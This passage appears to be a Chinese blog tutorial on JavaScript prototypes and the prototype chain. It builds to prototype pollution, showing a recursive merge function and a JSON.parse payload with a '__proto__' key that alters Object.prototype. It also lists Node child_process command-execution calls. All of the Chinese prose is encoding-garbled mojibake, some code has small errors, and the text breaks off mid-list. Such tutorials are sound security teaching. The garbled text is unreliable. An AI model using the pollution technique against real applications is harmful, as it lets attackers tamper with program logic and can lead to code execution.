Attack</h1><p>å¸¸ç”¨çš„æ‰§è¡Œå‡½æ•°</p><blockquote><p>require(â€˜child_processâ€™).spawnSync(â€˜lsâ€™,[â€˜.â€™]).stdout.toString()</p><p>stdout ç”¨æ¥æ•è·è¾“å‡º</p><p>è¿˜æœ‰ execï¼ŒexecSyncï¼Œspawnï¼ŒspawnSync(è¿™ä¸¤ä¸ªéœ€è¦ stdout æ¥æ•è·è¾“å‡º)</p></blockquote><h2 id="JavaScript-ä¸­çš„å¯¹è±¡"><a href="#JavaScript-ä¸­çš„å¯¹è±¡" class="headerlink" title="JavaScript ä¸­çš„å¯¹è±¡"></a>JavaScript ä¸­çš„å¯¹è±¡</h2><h3 id="å»ºç«‹å¯¹è±¡"><a href="#å»ºç«‹å¯¹è±¡" class="headerlink" title="å»ºç«‹å¯¹è±¡"></a>å»ºç«‹å¯¹è±¡</h3><p>JavaScript ä¸­ å»ºç«‹å¯¹è±¡æœ‰ä¸¤ç§å½¢å¼</p><ul><li>æ„é€ å‡½æ•°åˆ›å»º</li></ul><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs javascript"><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">student</span>(<span class="hljs-params"></span>)</span>&#123;<br>    <span class="hljs-built_in">this</span>.name = <span class="hljs-string">&quot;Yuyan Peng&quot;</span>;<br>    <span class="hljs-built_in">this</span>.test = <span class="hljs-function"><span class="hljs-keyword">function</span>(<span class="hljs-params"></span>)</span>&#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-number">2333</span>;<br>    &#125;<br>&#125;<br>student.prototype.a=<span class="hljs-number">3</span>;<br>stu = <span class="hljs-keyword">new</span> student();<br><span class="hljs-built_in">console</span>.log(stu.test());<br><span class="hljs-built_in">console</span>.log(stu.a);<br></code></pre></td></tr></table></figure><ul><li>é€šè¿‡ Object åˆ›å»º</li></ul><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs javascript"><span class="hljs-keyword">var</span> a = <span class="hljs-keyword">new</span> <span class="hljs-built_in">Object</span>();<br>a.c=<span class="hljs-number">3</span><br><span class="hljs-built_in">console</span>.log(a.c)<br></code></pre></td></tr></table></figure><p>å¯¹äºä½¿ç”¨è¿‡åŸºäºç±»çš„è¯­è¨€ (å¦‚ Java æˆ– C++) çš„å¼€å‘äººå‘˜æ¥è¯´ï¼ŒJavaScript æœ‰ç‚¹ä»¤äººå›°æƒ‘ï¼Œå› ä¸ºå®ƒæ˜¯åŠ¨æ€çš„ï¼Œå¹¶ä¸”æœ¬èº«ä¸æä¾›ä¸€ä¸ª class å®ç°ã€‚ï¼ˆåœ¨ ES2015/ES6 ä¸­å¼•å…¥äº† class å…³é”®å­—ï¼Œä½†é‚£åªæ˜¯è¯­æ³•ç³–ï¼ŒJavaScript ä»ç„¶æ˜¯åŸºäºåŸå‹çš„ï¼‰ã€‚ ä¹‹å‰æˆ‘ä»¬æ‰€è®¤ä¸ºçš„ç±»åœ¨ js ä¸­éƒ½æ˜¯ç”¨å‡½æ•°æ¥å£°æ˜çš„ ï¼ˆäº‹å®ä¸Š js ä¸æ‰¿è®¤ç±» åªæ˜¯æœ‰ç›¸åº”çš„æ¦‚å¿µè€Œå·² ä¸‹é¢ä¸ºäº†è¯´æ˜æ–¹ä¾¿ éƒ½æ²¿ç”¨ç±»çš„è¯´æ³•ï¼‰ ä¸¾ä¸ªæ —å­</p><figure class="highlight abnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs abnf">function testï¼ˆï¼‰&#123;<br>    this.a = <span class="hljs-string">&quot;joy&quot;</span><span class="hljs-comment">;</span><br>&#125;<br><br><span class="hljs-attribute">b</span> = new test<span class="hljs-comment">;</span><br>console.log(b.a)<span class="hljs-comment">;</span><br></code></pre></td></tr></table></figure><p>ä»ä¸Šé¢å¯ä»¥çœ‹åˆ° å®ä¾‹åŒ–å¯¹è±¡ b åå°±å¯ä»¥è¾“å‡º test ç±»çš„å±æ€§ a äº† æˆ‘ä»¬å…¶å®å¾ˆå®¹æ˜“æƒ³åˆ°æ„é€ å‡½æ•° æ„é€ å‡½æ•°å°±æ˜¯åœ¨ new ä¸€ä¸ªå¯¹è±¡çš„æ—¶å€™è¢«è°ƒç”¨ åœ¨è¿™å…¶å®å°±æ˜¯ js çš„ä¸€ä¸ªé‡è¦æ¦‚å¿µâ€”â€”ç»§æ‰¿ï¼Œç»§æ‰¿çš„æ•´ä¸ªå¯¹åº”å…³ç³»å°±æ˜¯è¿™ä¸ªå¯¹è±¡çš„åŸå‹é“¾ æ‰€ä»¥ <code>test()å‡½æ•°å°±æ˜¯ç±»testçš„æ„é€ å‡½æ•°</code></p><p>ä¸Šé¢æ²¡é—®é¢˜æˆ‘ä»¬ç»§ç»­ï¼š</p><h3 id="prototype-å’Œproto"><a href="#prototype-å’Œproto" class="headerlink" title="prototype å’Œproto"></a>prototype å’Œ<strong>proto</strong></h3><p>ä¸€ä¸ªç±»ä¸­å¿…å®šæœ‰ä¸€äº›æ–¹æ³•æ¯”å¦‚è¯´å±æ€§ this.age æŠŠæ–¹æ³•å®šä¹‰åœ¨æ„é€ å‡½æ•°å†…éƒ¨ï¼š</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs javascript"><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">student</span>(<span class="hljs-params"></span>)</span>&#123;<br>    <span class="hljs-built_in">this</span>.age=<span class="hljs-number">19</span>;<br>    <span class="hljs-built_in">this</span>.show=<span class="hljs-function"><span class="hljs-keyword">function</span>(<span class="hljs-params"></span>)</span>&#123;<br>        <span class="hljs-built_in">console</span>.log(<span class="hljs-built_in">this</span>.age)<br>        &#125;<br>    &#125;<br><br>(<span class="hljs-keyword">new</span> student).show();<br></code></pre></td></tr></table></figure><p>å†ä¸€æ¬¡çœ‹åˆ° new ä¸€ä¸ªå¯¹è±¡å°±ä¼šç»§æ‰¿åˆ°å®ƒçš„å±æ€§ åœ¨æ–°å¼€è¾Ÿçš„å­˜å‚¨ç©ºé—´å°±å·²ç»å­˜æ”¾æœ‰å¯¹åº”çš„å±æ€§äº†</p><p>ä½†è¿™æ ·å†™æœ‰ä¸€ä¸ªé—®é¢˜ æ¯å½“æˆ‘éœ€è¦åˆ›å»ºä¸€ä¸ª student å¯¹è±¡çš„æ—¶å€™ this.show = function{â€¦}å°±ä¼šæ‰§è¡Œä¸€æ¬¡ è¿™ä¸ª show æ–¹æ³•æ˜¯ç»‘å®šåœ¨å¯¹è±¡ä¸Šçš„ è€Œä¸æ˜¯ç»‘å®šåœ¨â€œç±»â€ä¸Šçš„</p><ul><li><input checked="" disabled="" type="checkbox"> prototype<pre><code>ç”¨åŸå‹ prototype å®ç°</code></pre></li></ul><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs javascript"><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">Student</span>(<span class="hljs-params"></span>)</span>&#123;<br>    <span class="hljs-built_in">this</span>.age=<span class="hljs-number">19</span>;<br>&#125;<br><br>Student.prototype.show = <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">show</span>(<span class="hljs-params"></span>)</span>&#123;<span class="hljs-built_in">console</span>.log(<span class="hljs-built_in">this</span>.age)&#125;<br><br><span class="hljs-keyword">var</span> stu = <span class="hljs-keyword">new</span> Student;<br>stu.show();<br></code></pre></td></tr></table></figure><p>prototype æ˜¯ç±» Student çš„ä¸€ä¸ªå±æ€§ æ‰€æœ‰ç±»å¯¹è±¡åœ¨å®ä¾‹åŒ–åéƒ½å…·æœ‰å’Œ prototype ä¸­çš„å˜é‡ã€å±æ€§å’Œæ–¹æ³• åŒæ—¶åªæœ‰ç±»æ‰æœ‰ prototype å±æ€§ï¼Œä½†æ˜¯ç±»<code>å®ä¾‹åŒ–å‡ºæ¥çš„å¯¹è±¡</code>å´æ²¡æœ‰ prototype ä¸èƒ½é€šè¿‡ prototype è®¿é—®å®ä¾‹åŒ–å¯¹è±¡çš„åŸå‹</p><ul><li><input checked="" disabled="" type="checkbox"> __proto__<pre><code>å°±ä¸Šä¾‹è€Œè¨€ æˆ‘ä»¬å¯ä»¥é€šè¿‡ Student.prototype è®¿é—® Student ç±»çš„åŸå‹ ä½†æ˜¯å®ä¾‹åŒ–åçš„å¯¹è±¡ stu æ˜¯ä¸èƒ½é€šè¿‡ prototype è®¿é—®åŸå‹çš„ è¿™æ—¶å€™æˆ‘ä»¬ä½¿ç”¨\_\_proto\_\_æ¥è®¿é—®å®ä¾‹åŒ–å¯¹è±¡çš„åŸå‹ stu.\_\_proto\_\_==Student.prototype çœ‹åˆ°äºŒè€…æ˜¯ç­‰ä»·çš„</code></pre></li></ul><p><strong>åœ¨ Java.Script ä¸­ ä¸‡ç‰©çš†å¯¹è±¡</strong><br>æ‰€æœ‰çš„å˜é‡ï¼Œå‡½æ•°ï¼Œæ•°ç»„ï¼Œå¯¹è±¡éƒ½å§‹äº Object çš„åŸå‹å³ Object.prototype å¯¹è±¡çš„__proto__å’Œç±»çš„ prototype ç›¸å¯¹åº”</p><p>ç‰¹åˆ«çš„ å‡½æ•°ä¹Ÿå¯ä»¥ä½¿ç”¨__proto__å› ä¸ºå‡½æ•°ä¹Ÿæ˜¯å¯¹è±¡ åé¢ç»™äºˆè¯´æ˜</p><p><img src="https://raw.githubusercontent.com/kIl3rr/photo/main/n.png"></p><h3 id="åŸå‹é“¾"><a href="#åŸå‹é“¾" class="headerlink" title="åŸå‹é“¾"></a>åŸå‹é“¾</h3><p>åœ¨ javascript ä¸­ æ¯ä¸ªå¯¹è±¡çš„éƒ½æœ‰ä¸€ä¸ªæŒ‡å‘ä»–çš„åŸå‹(prototype)çš„å†…éƒ¨é“¾æ¥ è¿™ä¸ªåŸå‹å¯¹è±¡åˆæœ‰å®ƒè‡ªå·±çš„åŸå‹ï¼Œç›´åˆ° null ä¸ºæ­¢</p><figure class="highlight reasonml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs reasonml"><span class="hljs-keyword">function</span> <span class="hljs-constructor">Pt()</span>&#123;<br>    this.b = <span class="hljs-string">&quot;I don&#x27;t know what I&#x27;m up to.&quot;</span><br>&#125;<br><br><span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">Pt</span>.</span></span>prototype;<br><br>var ppt = <span class="hljs-keyword">new</span> Pt;<br>ppt.__proto__;<br>ppt.<span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">__proto__</span>.</span><span class="hljs-module"><span class="hljs-identifier">__proto__</span>;</span></span><br><br></code></pre></td></tr></table></figure><p>å¯ä»¥çœ‹å‡ºåŸå‹é“¾ä¸º ppt-&gt;Pt.prototype-&gt;Object.prototype-&gt;null</p><p>æ•°ç»„<br><img src="https://raw.githubusercontent.com/kIl3rr/photo/main/%E5%8E%9F%E5%9E%8B%E9%93%BE2.png"><br>åŸå‹é“¾ c-&gt;array.prototype-&gt;Object.prototype-&gt;null<br>å‡½æ•°<br><img src="https://raw.githubusercontent.com/kIl3rr/photo/main/%E5%8E%9F%E5%9E%8B%E9%93%BE3.png"><br>åŸå‹é“¾ d-&gt;function.prototype-&gt;Object.prototype-&gt;null</p><p>å¯è§ js ä¸­ä¸€åˆ‡çš†å¯¹è±¡ ä¸€åˆ‡éƒ½å§‹äº Object.prototype</p><p>æ€»ç»“ä¸€ä¸‹ï¼š</p><ul><li>prototype æ˜¯ç±»çš„å±æ€§ æ‰€æœ‰ç±»å¯¹è±¡å®ä¾‹åŒ–éƒ½ä¼šä» prototype ç»§æ‰¿å±æ€§å’Œæ–¹æ³•</li><li>ä¸€ä¸ªå¯¹è±¡çš„__proto__å±æ€§æŒ‡å‘è¿™ä¸ªå®ä¾‹åŒ–è¿™ä¸ªå¯¹è±¡çš„ç±»çš„ prototype å±æ€§</li></ul><p><code>instanceofè¿ç®—ç¬¦</code>ï¼Œå®ƒå¯ä»¥ç”¨æ¥åˆ¤æ–­æŸä¸ªæ„é€ å‡½æ•°çš„ prototype å±æ€§æ˜¯å¦å­˜åœ¨å¦å¤–ä¸€ä¸ªè¦æ£€æµ‹å¯¹è±¡çš„åŸå‹é“¾ï¼Œä¸‹é¢æ˜¯ instanceof è¿ç®—ç¬¦çš„ä¸€ä¸ªå®ä¾‹</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs javascript"><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">Pt</span>(<span class="hljs-params"></span>)</span>&#123;&#125;<br><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">Ob</span>(<span class="hljs-params"></span>)</span>&#123;&#125;<br><br><span class="hljs-keyword">var</span> ppt = <span class="hljs-keyword">new</span> Pt;<br><span class="hljs-built_in">console</span>.info(ppt <span class="hljs-keyword">instanceof</span> Pt)<span class="hljs-comment">//true //ppt.__proto__===Pt.prototype</span><br><span class="hljs-built_in">console</span>.info(ppt <span class="hljs-keyword">instanceof</span> ob)<span class="hljs-comment">//false å› ä¸ºå¯¹è±¡pptçš„åŸå‹ä¸æ˜¯Ob</span><br></code></pre></td></tr></table></figure><p>ä¸Šé¢è¯´åˆ°å‡½æ•°ä¹Ÿæ˜¯ä¸€ä¸ªå¯¹è±¡</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs javascript"><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">hello</span>(<span class="hljs-params"></span>)</span>&#123;<br>    <span class="hljs-built_in">this</span>.test = <span class="hljs-function"><span class="hljs-keyword">function</span>(<span class="hljs-params"></span>)</span>&#123;<br>        <span class="hljs-built_in">console</span>.log(<span class="hljs-string">&quot;hello world&quot;</span>);<br>    &#125;<br>    <span class="hljs-keyword">return</span> <span class="hljs-number">2333</span>;<br>    &#125;<br><br><span class="hljs-keyword">var</span> lib = <span class="hljs-keyword">new</span> hello;<br>lib.test();<br><br><span class="hljs-built_in">console</span>.log(hello <span class="hljs-keyword">instanceof</span> <span class="hljs-built_in">Object</span>)<span class="hljs-comment">//ture å¾—è¯</span><br></code></pre></td></tr></table></figure><h3 id="åŸå‹é“¾çš„å˜é‡æœç´¢"><a href="#åŸå‹é“¾çš„å˜é‡æœç´¢" class="headerlink" title="åŸå‹é“¾çš„å˜é‡æœç´¢"></a>åŸå‹é“¾çš„å˜é‡æœç´¢</h3><p>æ¥çœ‹ä¸€ä¸ªä¾‹å­</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs javascript"><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">I</span>(<span class="hljs-params"></span>)</span>&#123;<br>    <span class="hljs-built_in">this</span>.a = <span class="hljs-string">&quot;abc&quot;</span>;<br>    <span class="hljs-built_in">this</span>.b = <span class="hljs-string">&quot;123&quot;</span>;<br>&#125;<br><br><span class="hljs-keyword">var</span> j = <span class="hljs-keyword">new</span>(I);<br>I.prototype.c = <span class="hljs-string">&quot;789&quot;</span>;<br><span class="hljs-built_in">console</span>.log(j.c);<br></code></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/kIl3rr/photo/main/image-20211119005530731.png" alt="image-20211119005530731"><br>èƒ½çœ‹å‡ºä»€ä¹ˆ</p><p>å®ä¾‹åŒ– I åï¼Œå¯¹è±¡ j ä¸åº”è¯¥æœ‰å±æ€§ cï¼Œä½†æ­¤æ—¶ç»™ç±»å¯¹è±¡ I æ–°å¢ä¸€ä¸ªå±æ€§æ—¶ï¼Œåœ¨ j ä¸­ä¹Ÿæœ‰äº† c å±æ€§ï¼Œè¿™æ˜¯ç±»ä¸å¯¹è±¡ä¸­ä»æœªè§è¿‡çš„</p><p>å½“è¦ä½¿ç”¨æˆ–è¾“å‡ºä¸€ä¸ªå˜é‡æ—¶ï¼šé¦–å…ˆä¼šåœ¨æœ¬å±‚ä¸­æœç´¢ç›¸åº”çš„å˜é‡ï¼Œå¦‚æœä¸å­˜åœ¨çš„è¯ï¼Œå°±ä¼šå‘ä¸Šæœç´¢ï¼Œå³åœ¨è‡ªå·±çš„çˆ¶ç±»ä¸­æœç´¢ï¼Œå½“çˆ¶ç±»ä¸­ä¹Ÿæ²¡æœ‰æ—¶ï¼Œå°±ä¼šå‘ç¥–çˆ¶ç±»æœç´¢ï¼Œç›´åˆ°æŒ‡å‘ nullï¼Œå¦‚æœæ­¤æ—¶è¿˜æ²¡æœ‰æœç´¢åˆ°ï¼Œå°±ä¼šè¿”å› undefined</p><p>é‚£ä¹ˆæ­¤æ—¶çš„åŸå‹é“¾å°±æ˜¯ j-&gt;I.prototype-&gt;Object.prototype-&gt;null</p><p>js çš„è¿™ä¸ªæŸ¥æ‰¾æœºåˆ¶ å°±æ˜¯è¿ç”¨åœ¨é¢å‘å¯¹è±¡çš„ç»§æ‰¿ä¸­ ç§°ä½œ prototype ç»§æ‰¿é“¾</p><p>â­ è¯´åˆ°è¿™é‡Œå†ä¸€æ¬¡æ€»ç»“å¦‚ä¸‹</p><ul><li>æ¯ä¸ªæ„é€ å‡½æ•°(constructor)éƒ½æœ‰ä¸€ä¸ªåŸå‹å¯¹è±¡(prototype)</li><li>å¯¹è±¡çš„__proto__å±æ€§ï¼ŒæŒ‡å‘ç±»çš„åŸå‹å¯¹è±¡ prototype</li><li>JavaScript ä½¿ç”¨ prototype é“¾å®ç°ç»§æ‰¿æœºåˆ¶</li></ul><h3 id="åŸå‹é“¾æ±¡æŸ“"><a href="#åŸå‹é“¾æ±¡æŸ“" class="headerlink" title="åŸå‹é“¾æ±¡æŸ“"></a>åŸå‹é“¾æ±¡æŸ“</h3><p>ä¸‹é¢æˆ‘ä»¬æ¥çœ‹</p><figure class="highlight reasonml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs reasonml">var Student = &#123;age:<span class="hljs-number">19</span>&#125;<br><br>console.log(<span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">Student</span>.</span></span>age)<br><br><span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">Student</span>.</span><span class="hljs-module"><span class="hljs-identifier">__proto__</span>.</span></span>age = <span class="hljs-number">20</span><br><br>console.log(<span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">Student</span>.</span></span>age)<br><br>var Teacher = &#123;&#125;<br><br>console.log(<span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">Teacher</span>.</span></span>age)<br></code></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/kIl3rr/photo/main/%E5%8E%9F%E5%9E%8B%E9%93%BE%E6%B1%A1%E6%9F%93.png"></p><p>åŸå‹é“¾ï¼šStudent.__proto__-&gt;Object.prototype-&gt;null</p><p>éšç€ä¸Šé¢çš„é€æ­¥æ¢è®¨ åŸå‹é“¾æ±¡æŸ“åŠå…¶äº§ç”Ÿçš„æ¼æ´ä¹Ÿå°±å‘¼ä¹‹æ¬²å‡ºäº† æˆ‘ä»¬é€šè¿‡æ§åˆ¶çˆ¶ç±»ç”šè‡³ç¥–ç±»çš„å±æ€§(ä¿®æ”¹è¿™ä¸ªå¯¹è±¡çš„åŸå‹)å°±å¯ä»¥å½±å“æ¥è‡ªåŒä¸€ä¸ªç±»ã€çˆ¶ç¥–ç±»çš„å¯¹è±¡ è¿™å°±æ˜¯åŸå‹é“¾æ±¡æŸ“</p><p>çœ‹ä¸€ä¸ªä¾‹å­</p><figure class="highlight arcade"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs arcade"><span class="hljs-comment">//First.aæˆ–è€…First[&#x27;a&#x27;]å¯¹æ•°ç»„å…ƒç´ çš„è®¿é—®</span><br><span class="hljs-number">1.</span><br><span class="hljs-keyword">var</span> <span class="hljs-built_in">First</span> = Array();<br><span class="hljs-built_in">First</span>[<span class="hljs-string">&#x27;aa&#x27;</span>] = <span class="hljs-string">&quot;aaa&quot;</span>;<br><span class="hljs-built_in">First</span>[<span class="hljs-string">&#x27;bb&#x27;</span>] = <span class="hljs-string">&quot;bbb&quot;</span>;<br><span class="hljs-built_in">First</span>.aa<br><span class="hljs-built_in">First</span>.bb<br><br><span class="hljs-number">2.</span><br><span class="hljs-keyword">var</span> <span class="hljs-built_in">Second</span> = &#123;<span class="hljs-string">&quot;c&quot;</span>:<span class="hljs-string">&quot;ccc&quot;</span>,<span class="hljs-string">&quot;d&quot;</span>:<span class="hljs-string">&quot;ddd&quot;</span>&#125;<br>typeof <span class="hljs-built_in">Second</span>;<br><span class="hljs-built_in">Second</span>.c<br><span class="hljs-built_in">Second</span>[<span class="hljs-string">&#x27;c&#x27;</span>]<br></code></pre></td></tr></table></figure><p>ä¸Šé¢çš„ prototype æ˜¯ä¸€æ ·çš„<br>çœ‹ä¸€ç»„ Second.__proto__==Second[â€œ__proto__â€œ]=Object.prototype</p><p>æ‰€ä»¥è¯´ï¼ŒåŸå‹é“¾æ±¡æŸ“ä¸€èˆ¬ä¼šå‡ºç°åœ¨å¯¹è±¡ã€æˆ–æ•°ç»„çš„é”®åæˆ–å±æ€§åå¯æ§,è€Œä¸”æ˜¯èµ‹å€¼è¯­å¥çš„æƒ…å†µä¸‹ ä¸‹é¢æ˜¯ä¸ªå¤±è´¥æ¡ˆä¾‹</p><figure class="highlight n1ql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs n1ql">function <span class="hljs-keyword">merge</span>(target, source)&#123;<br>    <span class="hljs-keyword">for</span> (<span class="hljs-keyword">let</span> <span class="hljs-keyword">key</span> <span class="hljs-keyword">in</span> source)&#123;<br>        <span class="hljs-keyword">if</span> (<span class="hljs-keyword">key</span> <span class="hljs-keyword">in</span> source &amp;&amp; <span class="hljs-keyword">key</span> <span class="hljs-keyword">in</span> target)&#123;<br>            <span class="hljs-keyword">merge</span>(target[<span class="hljs-keyword">key</span>], source[<span class="hljs-keyword">key</span>])<br>        &#125; <span class="hljs-keyword">else</span> &#123;<br>                target[<span class="hljs-keyword">key</span>] = source[<span class="hljs-keyword">key</span>]<br>        &#125;<br>     &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>è¯•ä¸€ä¸‹</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">let</span> o<span class="hljs-number">1</span> = &#123;&#125;<br><span class="hljs-attribute">let</span> o<span class="hljs-number">2</span> = &#123;a: <span class="hljs-number">1</span>,<span class="hljs-string">&quot;__proto__&quot;</span>: &#123;b: <span class="hljs-number">2</span>&#125;&#125;<br><span class="hljs-attribute">merge</span>(o<span class="hljs-number">1</span>, o<span class="hljs-number">2</span>)<br><span class="hljs-attribute">console</span>.log(o<span class="hljs-number">1</span>.a, o<span class="hljs-number">1</span>.b)<br><span class="hljs-attribute">o3</span> = &#123;&#125;<br><span class="hljs-attribute">console</span>.log(o<span class="hljs-number">3</span>.b)<br></code></pre></td></tr></table></figure><p>å“‘ç«äº†ï¼Œpayload å¹¶æ²¡æœ‰è¾¾åˆ°æˆ‘ä»¬çš„é¢„æœŸï¼Œç”¨ JavaScript åˆ›å»º o2 çš„è¿‡ç¨‹ï¼ˆlet o2 = {a: 1, â€œ__proto__â€œ: {b: 2}}ï¼‰ä¸­ï¼Œ__proto__å·²ç»ä»£è¡¨ o2 çš„åŸå‹äº†ï¼Œæˆ‘ä»¬çš„é”®å€¼ç›¸å½“äºè‡ªå®šä¹‰äº†ä¸€ä¸ªåŸå‹å¯¹è±¡ï¼Œæ²¡æ³•åœ¨æ–°çš„å¯¹è±¡ä¸­æ·»åŠ __proto__é”®å€¼ï¼Œæ­¤æ—¶éå† o2 çš„æ‰€æœ‰é”®åï¼Œæ‹¿åˆ°çš„åªæ˜¯[a, b]ï¼Œ__proto__å¹¶ä¸æ˜¯ä¸€ä¸ª keyï¼Œè‡ªç„¶ä¹Ÿä¸ä¼šä¿®æ”¹ Object çš„åŸå‹ã€‚</p><p>é‚£ä¹ˆï¼Œå¦‚ä½•è®©__proto__è¢«è®¤ä¸ºæ˜¯ä¸€ä¸ªé”®åå‘¢ï¼Ÿç”¨ JSON è§£æä¸€ä¸‹é”®å€¼å¯¹(JSON.parse ä¼šæŠŠä¸€ä¸ª json å­—ç¬¦ä¸² è½¬åŒ–ä¸º javascript çš„ object)ï¼Œå°†ä»£ç æ”¹æˆå¦‚ä¸‹ï¼š</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">let</span> o<span class="hljs-number">1</span> = &#123;&#125;<br><span class="hljs-attribute">let</span> o<span class="hljs-number">2</span> = JSON.parse(&#x27;&#123;<span class="hljs-string">&quot;a&quot;</span>: <span class="hljs-number">1</span>, <span class="hljs-string">&quot;__proto__&quot;</span>: &#123;<span class="hljs-string">&quot;b&quot;</span>: <span class="hljs-number">2</span>&#125;&#125;&#x27;) //?æ•°ç»„å…ƒç´ åŒå¼•å·<br><span class="hljs-attribute">merge</span>(o<span class="hljs-number">1</span>, o<span class="hljs-number">2</span>)<br><span class="hljs-attribute">console</span>.log(o<span class="hljs-number">1</span>.a, o<span class="hljs-number">1</span>.b)<br><span class="hljs-attribute">o3</span> = &#123;&#125;<br><span class="hljs-attribute">console</span>.log(o<span class="hljs-number">3</span>.b)<br></code></pre></td></tr></table></figure><p>å¯è§ï¼Œæ–°å»ºçš„ o3 å¯¹è±¡ï¼Œä¹Ÿå­˜åœ¨ b å±æ€§ï¼Œè¯´æ˜ Object å·²ç»è¢«æ±¡æŸ“ï¼Œå› ä¸º JSON è§£æä¸‹ï¼Œ__proto__ä¼šè¢«è®¤ä¸ºæ˜¯ä¸€ä¸ªçœŸæ­£çš„â€œé”®åâ€ï¼Œè€Œä¸ä»£è¡¨â€œåŸå‹â€ï¼Œæ‰€ä»¥åœ¨é o2 æ—¶ä¼šå­˜åœ¨è¿™ä¸ªé”®</p><p>merge æ“ä½œæ—¶æœ€å¸¸è§çš„å¯èƒ½æ§åˆ¶é”®åçš„æ“ä½œï¼Œä¹Ÿæœ€èƒ½è¢«åŸå‹é“¾æ”»å‡»ï¼Œå¾ˆå¤šå¸¸è§çš„åº“éƒ½å­˜åœ¨è¿™ä¸ªé—®é¢˜</p><p>æœ‰å“ªäº›æƒ…å†µåŸå‹é“¾ä¼šè¢«æ±¡æŸ“ï¼Ÿå“ªäº›æƒ…å†µåŸå‹é“¾èƒ½è¢«ä¿®æ”¹å‘¢ï¼Ÿå“ªäº›æƒ…å†µä¸‹æˆ‘ä»¬å¯ä»¥è®¾ç½®__proto__çš„å€¼å‘¢ï¼Ÿ<br>å…¶å®æ‰¾æ‰¾èƒ½å¤Ÿæ§åˆ¶æ•°ç»„ï¼ˆå¯¹è±¡ï¼‰çš„â€œé”®åâ€çš„æ“ä½œå³å¯ï¼š</p><ul><li>å¯¹è±¡ merge</li><li>å¯¹è±¡ cloneï¼ˆå…¶å®å†…æ ¸å°±æ˜¯å°†å¾…æ“ä½œçš„å¯¹è±¡ merge 